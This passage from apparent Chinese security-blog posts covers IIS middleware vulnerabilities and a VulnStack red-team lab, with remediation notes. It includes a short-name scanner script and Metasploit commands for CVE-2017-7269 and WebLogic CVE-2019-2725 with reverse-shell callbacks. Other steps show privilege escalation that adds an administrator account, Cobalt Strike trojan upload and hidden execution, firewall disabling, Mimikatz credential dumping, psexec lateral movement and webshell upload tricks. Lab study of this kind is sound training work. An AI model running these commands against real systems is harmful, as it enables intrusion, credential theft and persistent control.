class="string">'/1.aspx'</span>)</span><br><span class="line">                <span class="keyword">if</span> status == <span class="number">404</span>:</span><br><span class="line">                    self.msg_queue.put(<span class="string">'[+] %s~1%s\t[scan in progress]'</span> % (url, ext))</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> len(url) - len(self.path)&lt; <span class="number">6</span>:    <span class="comment"># enum first 6 chars only</span></span><br><span class="line">                        <span class="keyword">for</span> c <span class="keyword">in</span> self.alphanum:</span><br><span class="line">                            self.queue.put( (url + c, ext) )</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> ext == <span class="string">'.*'</span>:</span><br><span class="line">                            self.queue.put( (url, <span class="string">''</span>) )</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">if</span> ext == <span class="string">''</span>:</span><br><span class="line">                            self.dirs.append(url + <span class="string">'~1'</span>)</span><br><span class="line">                            self.msg_queue.put(<span class="string">'[+] Directory '</span> +  url + <span class="string">'~1\t[Done]'</span>)</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">elif</span> len(ext) == <span class="number">5</span> <span class="keyword">or</span> (<span class="keyword">not</span> ext.endswith(<span class="string">'*'</span>)):    <span class="comment"># .asp*</span></span><br><span class="line">                            self.files.append(url + <span class="string">'~1'</span> + ext)</span><br><span class="line">                            self.msg_queue.put(<span class="string">'[+] File '</span> + url + <span class="string">'~1'</span> + ext + <span class="string">'\t[Done]'</span>)</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>:</span><br><span class="line">                                self.queue.put( (url, ext[:<span class="number">-1</span>] + c + <span class="string">'*'</span>) )</span><br><span class="line">                                <span class="keyword">if</span> len(ext) &lt; <span class="number">4</span>:    <span class="comment"># &lt; len('.as*')</span></span><br><span class="line">                                    self.queue.put( (url, ext[:<span class="number">-1</span>] + c) )</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">except</span> Queue.Empty,e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[Exception]'</span>, e</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: python IIS_shortname_Scan.py http://www.target.com/'</span></span><br><span class="line">        sys.exit()</span><br><span class="line"> </span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    s = Scanner(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.is_vul():</span><br><span class="line">        s.STOP_ME = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server is not vulnerable'</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Server is vulnerable, please wait, scanning...'</span></span><br><span class="line">    s.run()</span><br><span class="line">    s.report()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594635025860.png" alt="1594635025860"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h2><ul>
+<li><p>升级.net framework </p>
+</li>
+<li><p>修改注册表键值： </p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem </p>
+<p>修改NtfsDisable8dot3NameCreation为1。再新建文件夹，将原网站目录内容拷贝进入新建的文件夹，使用 新建的文件夹作为网站目录。 </p>
+</li>
+</ul>
+<h1 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a><strong>产生原因</strong></h2><p>当IIS6.0 开启了WebDav协议（开启PROPFIND协议）时存在此漏洞，缓冲区溢出导致远程命令执行。 </p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><strong>漏洞检测</strong></h2><p>基于版本，windowsserver2003 R2+iis6.0+开启PROPFIND协议的服务器存在此漏洞。 </p>
+<h2 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h2><p>可以获取服务器shell </p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>靶机环境：windows server2003+iis6.0 </p>
+<p>下载exp: git clone <a href="https://github.com/Al1ex/CVE-2017-7269" target="_blank" rel="noopener">https://github.com/Al1ex/CVE-2017-7269</a> </p>
+<p>复制cve-2017-7269.rb到相应的目录下面： </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cp cve_2017_7269.rb  /usr/share/metasploit-framework/modules/exploits/windows/iis/cve_2017_7269.rb</span><br><span class="line"><span class="comment">#这里需要将cve-2017-7269.rb改为cve_2017_7269.rb，否则会报错</span></span><br></pre></td></tr></table></figure>
+
+<p>msf更新后自带exploit/windows/iis/iis_webdav_scstoragepathfromurl模块，但是试了很久都没有成功</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use  exploits/windows/iis/cve_2017_7269</span><br><span class="line">set httphost 192.168.102.137</span><br><span class="line">set rhosts 192.168.102.137</span><br><span class="line">set physicalpathlength 19</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.102.128</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>其中physicalpathlength为网站路径，默认为19，也可通过爆破来得到长度<br>参考文章：<a href="https://xz.aliyun.com/t/6485#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/6485#toc-9</a></p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594644318564.png" alt="1594644318564"></p>
+<p>成功获得shell<br><img src="/2020/07/14/iiszhong-jian-jian/1594644338992.png" alt="1594644338992"></p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a><strong>漏洞修复</strong></h2><blockquote>
+<p>关闭WebDAV服务<br>使用相应的防护软件<br>升级操作系统 </p>
+</blockquote>
+<h1 id="本地提权漏洞"><a href="#本地提权漏洞" class="headerlink" title="本地提权漏洞"></a>本地提权漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>IIS 6.0默认不开启WebDAV,一旦开启了WebDAV,安装了IIS6.0的服务器将可能受到该漏洞的威胁。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h2><p>Windows 2003 R2开启WebDAV服务的IIS6.0</p>
+<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>使用上面获得的shell，查看当前用户权限<br><img src="/2020/07/14/iiszhong-jian-jian/1594715818472.png" alt="1594715818472"></p>
+<p>在根目录创建一个文件夹用来放提权相关文件，之后在meterpreter上传pr.exe</p>
+<p>其下载地址 为：<a href="https://github.com/klsfct/getshell/blob/master/MS09-012/pr.exe" target="_blank" rel="noopener">https://github.com/klsfct/getshell/blob/master/MS09-012/pr.exe</a><br>开始下载错了，卡了很久</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594716059053.png" alt="1594716059053"></p>
+<p>在msf里面执行命令会产生乱码，这里将msf权限派生到cobaltstrike<br>使用msf中的 exploit/windows/local/payload_inject模块</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">payload_inject</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_http</span></span><br><span class="line"><span class="title">set</span> <span class="title">DisablePayloadHandler</span> <span class="title">true</span>   #默认情况下，<span class="title">payload_inject</span>执行之后会在本地产生一个新的<span class="title">handler</span>，由于已经有了一个不需要再产生一个，所以这里设置为<span class="title">true</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> <span class="title">xxxx</span>                   #<span class="title">cobaltstrike</span>监听的<span class="title">ip</span></span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> <span class="title">xxxx</span>                  #<span class="title">cobaltstrike</span>监听的端口 </span><br><span class="line"><span class="title">set</span> <span class="title">session</span> 1                    #这里是当前获得的<span class="title">session</span>的<span class="title">id</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594716873116.png" alt="1594716873116"></p>
+<p>上线之后发现可以直接使用ms14-058进行提取<br><img src="/2020/07/14/iiszhong-jian-jian/1594717065348.png" alt="1594717065348"></p>
+<p><code>------------------------------------</code></p>
+<p>上传完成后执行<code>pr.exe whoami</code>即可得到一个system权限</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594725567419.png" alt="1594725567419"></p>
+<p>执行<code>net user admin admin /add</code>创建用户显示拒绝访问<br>执行<code>pr.exe &quot;net user admin admin /add&quot;</code>创建成功<br><img src="/2020/07/14/iiszhong-jian-jian/1594729147261.png" alt="1594729147261"></p>
+<p>之后将新创建的用户添加到管理员组</p>
+<blockquote>
+<p><code>pr.exe &quot;net localgroup administrators admin /add&quot;</code></p>
+</blockquote>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594729185270.png" alt="1594729185270"></p>
+<p>查看Administrator组用户<code>net localgroup Administrators</code><br><img src="/2020/07/14/iiszhong-jian-jian/1594729252421.png" alt="1594729252421"></p>
+<p>这个靶机开放了3389端口，可以直接远程桌面连接<br><img src="/2020/07/14/iiszhong-jian-jian/1594729890670.png" alt="1594729890670"></p>
+<p>如果未开放3389端口，可以上传一个3389.bat即可</p>
+<p><strong>漏洞修复</strong></p>
+<blockquote>
+<p>关闭WebDAV服务 </p>
+<p>使用相应的防护软件 </p>
+<p>升级操作系统 </p>
+</blockquote>
+<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a><strong>IIS 6.x</strong></h2><p><strong>产生原因：</strong>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞； </p>
+<p><strong>漏洞利用：</strong></p>
+<ul>
+<li><p>新建一个名为“test.asp”的目录，该目录下的任何文件都作为asp程序执行（特殊符号是”/“) </p>
+</li>
+<li><p>上传名为“test.asp;.jpg”的文件，虽然该文件真正的后缀名是”.jpg”,但由于含有特殊符号“;”，仍然会被IIS作为 asp程序执行。 </p>
+</li>
+</ul>
+<p><strong>产生影响：</strong>该解析漏洞可以使得入侵者绕过服务端的检测，进而getshell。 </p>
+<p><strong>漏洞修复：</strong> </p>
+<blockquote>
+<p>做好权限设置,限制用户创建文件夹。<br>可以通过自己编写正则,阻止上传 xx.asp;.jpg等类型的文件名<br>安装相应的防护软件</p>
+</blockquote>
+<h2 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a><strong>IIS 7.0/7.5</strong></h2><p>IIS 7.0/7.5：可解析后缀：.asa .cer .cdx .asp等脚本文件 </p>
+<p><strong>产生原因：</strong>由于php配置文件中，默认开启了cgi.fifix_pathinfo=1，PHP CGI会以 / 为分隔符号从后向前依次检查， 直到找到某个存在的文件，便把该文件作为php程序执行。 </p>
+<p><strong>利用方式：</strong></p>
+<ul>
+<li><p>上传图片木马test.jpg后直接访问*/test.jpg/.php，以php的方式解析执行。 </p>
+</li>
+<li><p>在shell.jpg的文件中写入php代码(当执行该文件的时候自动创建一个shell.php的一句话木马)，然后直 </p>
+</li>
+</ul>
+<p>接访问*/shell.jpg/.php，以php的方式解析运行，此时shell.php就会被创建。可getshell。 </p>
+<p><strong>漏洞危害：</strong>该解析漏洞可以使得入侵者绕过服务端的检测，进而getshell。 </p>
+<p><strong>漏洞修复：</strong> </p>
+<blockquote>
+<p>关闭cgi.fifix_pathinfo，令cgi.fifix_pathinfo为0; </p>
+<p>图片上传目录不给执行权限； </p>
+<p>升级php-fpm、nginx; </p>
+<p>安装相应的防护软件</p>
+</blockquote>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.ghtwf01.cn/index.php/archives/377/#menu_index_8" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/377/#menu_index_8</a></p>
+<p><a href="https://blog.csdn.net/Fly_hps/article/details/80305512" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80305512</a></p>
+]]></content>
+      <tags>
+        <tag>中间件漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[域渗透]Vulnstack(二)</title>
+    <url>/2020/07/14/Vulnstack%E4%BA%8C/</url>
+    <content><![CDATA[<p><strong>[ATT&amp;CK实战]VulnStack红队（二)</strong></p>
+<a id="more"></a>
+
+<p><strong>ATT&amp;CK实战系列二</strong></p>
+<p><strong>知识点</strong></p>
+<blockquote>
+<p>CVE-2019-2725</p>
+<p>msfconsole</p>
+<p>MS14-058 CVE-2014-4113提权</p>
+<p>Cobaltstrike学习</p>
+<p>黄金票据</p>
+<p>。。。。。。</p>
+</blockquote>
+<h1 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h1><p><strong>靶机地址</strong>：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</p>
+<blockquote>
+<ol>
+<li>Bypass UAC</li>
+<li>Windows系统NTLM获取（理论知识：Windows认证）</li>
+<li>Access Token利用（MSSQL利用）</li>
+<li>WMI利用</li>
+<li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li>
+<li>域内信息收集</li>
+<li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li>
+<li>域凭证收集</li>
+<li>后门技术（黄金票据/白银票据/Sid History/MOF）</li>
+</ol>
+</blockquote>
+<p>拓补图<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594131272927.png" alt="1594131272927"></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594124640804.png" alt="1594124640804"></p>
+<p>下载好靶机打开vmx文件即可，由于DMZ网段为192.168.111.0/24，所以需要将kali的子网ip设置为192.168.111.0<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594124806542.png" alt="1594124806542"></p>
+<p>web机中需要手动开启服务，在 C:\Oracle\Middleware\user_projects\domains\base_domain\bin 下有一个startWeblogic 的批处理，使用管理员身份运，管理员账号密码：Administrator/1qaz@WSX</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594125481858.png" alt="1594125481858"></p>
+<p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动</p>
+<blockquote>
+<p>kali攻击机ip:192.168.111.128</p>
+<p>WEB机ip：192.168.111.80</p>
+</blockquote>
+<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机ip为192.168.111.80<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594125983232.png" alt="1594125983232"></p>
+<p>端口扫描<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594127377707.png" alt="1594127377707"></p>
+<p>发现开放了80和7001两个http端口，在80端口没有发现什么，7001端口为<code>WebLogic Server 10.3.6.0</code>，可使用weblogicscan进行扫描</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python3 WeblogicScan.py <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span> <span class="number">7001</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594128452876.png" alt="1594128452876">目标存在CVE-2019-2725漏洞，去网上搜索利用exp<br><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725" target="_blank" rel="noopener">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725</a></p>
+<p>最终在msf中发现了疑似可以利用的模块<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594129842386.png" alt="1594129842386"></p>
+<h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">misc</span>/<span class="title">weblogic_deserialize_asyncresponseservice</span></span><br><span class="line"><span class="title">show</span> <span class="title">targets</span></span><br><span class="line"><span class="title">set</span> <span class="title">target</span> 1</span><br><span class="line"><span class="title">show</span> <span class="title">options</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.111.80</span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 192.168.111.128</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594165461303.png" alt="1594165461303"></p>
+<p>注意：这里要设置target，否则会显示恶心的<code>Exploit completed, but no session was created.</code>，不知道以前返回这个是否是因为未设置target</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="cobaltstrike学习"><a href="#cobaltstrike学习" class="headerlink" title="cobaltstrike学习"></a>cobaltstrike学习</h2><p>在做红日域渗透靶机一的时候由于学得很乱，所以便没有去学习cobaltstrike的使用，今天发现这个工具十分好用而且常用，所以在这里简单的学习一下</p>
+<p>参考链接：<a href="https://www.cnblogs.com/wkzb/p/12431487.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkzb/p/12431487.html</a><br><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/" target="_blank" rel="noopener">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></p>
+<p>Cobaltstrike下载链接: <a href="https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A" target="_blank" rel="noopener">https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A</a> 提取码：3drd</p>
+<p><strong>——cs启动——</strong></p>
+<p>cabaltstrike 工具使用时分为服务端和客户端，启动服务端后可以有很多客户端连接，团队合作使用很方便，实验时也可以服务端客户端在一台机器启动。</p>
+<p>服务端在 kali 启动，命令是：<code>./teamserver 本机 ip 连接密码</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">./teamserver <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594195836891.png" alt="1594195836891"></p>
+<p>客户端在物理机启动，双击cobaltstrike.bat即可，host填kali的ip，密码为刚才输入的test<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594196943183.png" alt="1594196943183"></p>
+<p><strong>——msf派生权限——</strong></p>
+<p>先在 cs 开启监听，Cobalt Strike-&gt;Listeners-Add，Name 随便填，Host 填写服务端kali的ip，Port 填写服务端设置的端口（在kali启动的时候可以看到<code>port 4444 started！</code>）</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197235511.png" alt="1594197235511"></p>
+<p>这个和web靶机的会话端口冲突，修改msf监听端口即可</p>
+<p>这时我们需要已经获得一个shell的会话，将会话ctrl+z放到后台，执行msf命令</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">payload_inject</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_http</span></span><br><span class="line"><span class="title">set</span> <span class="title">DisablePayloadHandler</span> <span class="title">true</span>   #默认情况下，<span class="title">payload_inject</span>执行之后会在本地产生一个新的<span class="title">handler</span>，由于已经有了一个不需要再产生一个，所以这里设置为<span class="title">true</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> <span class="title">xxxx</span>                   #<span class="title">cobaltstrike</span>监听的<span class="title">ip</span></span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> <span class="title">xxxx</span>                  #<span class="title">cobaltstrike</span>监听的端口 </span><br><span class="line"><span class="title">set</span> <span class="title">session</span> 1                    #这里是当前获得的<span class="title">session</span>的<span class="title">id</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197974328.png" alt="1594197974328"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594198066779.png" alt="1594198066779"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197995946.png" alt="1594197995946"></p>
+<p>cobaltstrike成功监听到WEB机的shell，右键进入beacon界面即可执行命令<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594198165918.png" alt="1594198165918"></p>
+<p>执行 shell 命令前面加上 shell 就可以了，例如 <code>shell dir</code><br>要使得 Beacon 每秒都多次连接到你，使用 sleep 0 命令。这是「交互式模式」。这种模式下命令 会立即执行</p>
+<p><strong>——制作木马——</strong><br>首先创建监听器用于木马回连，Host 为 cs 服务端的 ip</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594199580654.png" alt="1594199580654"></p>
+<p>Attacks-&gt;Packages-&gt;Windows Executable 再根据靶机的类型勾选，生成木马</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594199705068.png" alt="1594199705068"></p>
+<p>生成木马之后将其复制到kali机里面，在msf的会话中使用upload进行上传</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload /root/artifact.exe C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594200777460.png" alt="1594200777460"></p>
+<p>执行该木马，WEB机成功上线</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i -f artifact.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594200913023.png" alt="1594200913023"></p>
+<p><strong>——凭据存储——</strong></p>
+<p>密码读取</p>
+<blockquote>
+<p>右键-&gt;Access-&gt;Dump Hashes（需要Administrator权限）</p>
+<p>右键-&gt;Access-&gt;Run Mimikatz</p>
+<p>之后再点击凭证信息</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594202264921.png" alt="1594202264921"></p>
+</blockquote>
+<p>基本的操作先学到这里，还有一个psexec传递在下文会学习，其它强大的功能远不于此，后面边用边学<del>.</del></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>右键-&gt;执行-&gt;提权</p>
+<p>MS14-058 CVE-2014-4113为一个0day，可直接进行windows提权</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594210413819.png" alt="1594210413819"></p>
+<p>成功提权为system权限</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594210692641.png" alt="1594210692641"></p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p><strong>获取当前组的计算机名</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p>这里需要将防火墙手动关闭，否则会出现6118的错误</p>
+<blockquote>
+<p>第一种是刚刚msf反弹回来的输入<br>run post/windows/manage/enable_rdp<br>第二种是在菜刀命令终端下输入<br>netsh advfirewall set allprofiles state off</p>
+</blockquote>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594203346183.png" alt="1594203346183"></p>
+<p>未关闭防火墙只扫出来一个DC机器，将web和PC机器防火墙关闭后便能得到所有机器的信息<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594211521343.png" alt="1594211521343"></p>
+<p><strong>查看所有域</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594203450088.png" alt="1594203450088"></p>
+<p><strong>查看ip信息</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594211720611.png" alt="1594211720611"></p>
+<p>得到为双网卡，内网 10.10.10.1/24 网段，域控 ip 10.10.10.10</p>
+<p><strong>查看域名</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net config workstation</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212016261.png" alt="1594212016261"></p>
+<p>这个命令需要在Administrator权限下使用，域名为<code>WEB.de1ay.com</code></p>
+<p><strong>查看域内机器ip</strong></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212157651.png" alt="1594212157651"></p>
+<p><strong>查询域内用户</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net user /domain	<span class="comment">#该命令在本环境中需要在system权限下执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212327077.png" alt="1594212327077"></p>
+<p><strong>查询域控机器</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net group <span class="string">"Domain controllers"</span> /domain 	<span class="comment">#system权限下执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212381537.png" alt="1594212381537"></p>
+<p>得到域控机器为DC</p>
+<p><strong>查询域管理员</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell net group <span class="string">"domain admins"</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594212497227.png" alt="1594212497227"></p>
+<h2 id="psexec传递"><a href="#psexec传递" class="headerlink" title="psexec传递"></a>psexec传递</h2><p>psexec 是微软 pstools 工具包中最常用的一个工具，也是在内网渗透中的免杀渗透利器。psexec 能够在命令行下在对方没有开启 telnet 服务的时候返回一个半交互的命令行，像 telnet 客户端一样。原理是基于IPC共享，所以要目标打开 445 端口。另外在启动这个 psexec 建立连接之后对方机器上会被安装一个服务</p>
+<blockquote>
+<p>获取凭据后对目标网段进行端口存活探测，因为是 psexec 传递登录，这里仅需探测445端口</p>
+<p>命令：<code>portscan ip网段 端口 扫描协议（arp、icmp、none） 线程</code></p>
+<p>例如：<code>portscan 10.10.10.0/24 445 arp 200</code></p>
+</blockquote>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594214618444.png" alt="1594214618444"></p>
+<p>可看到域控机器DC开放了445端口</p>
+<p>工具栏 View-&gt;Targets 查看端口探测后的存活主机<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216367936.png" alt="1594216367936"></p>
+<p>新建一个 Listener，Payload 选择 windows/beacon_smb/bind_pipe</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216416085.png" alt="1594216416085"></p>
+<p>存活主机右键-&gt;Login-&gt;psexec，选择之前获取到的凭据信息（明文密文均可），选择 Listener 及主机 Session</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216434855.png" alt="1594216434855"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216719534.png" alt="1594216719534"></p>
+<p>DC成功上线，这里会话需要选择Administrator才行，system权限试了几次没有成功</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594216809369.png" alt="1594216809369"></p>
+<p>使用相同的方法可使PC机器上线<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594219729651.png" alt="1594219729651"></p>
+<p>所有机器均上线成功</p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>域控信息收集</strong></p>
+<p>在域控中获得KRBTGT账户NTLM密码hash和SID<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217354108.png" alt="1594217354108"></p>
+<p><strong>黄金票据利用</strong></p>
+<blockquote>
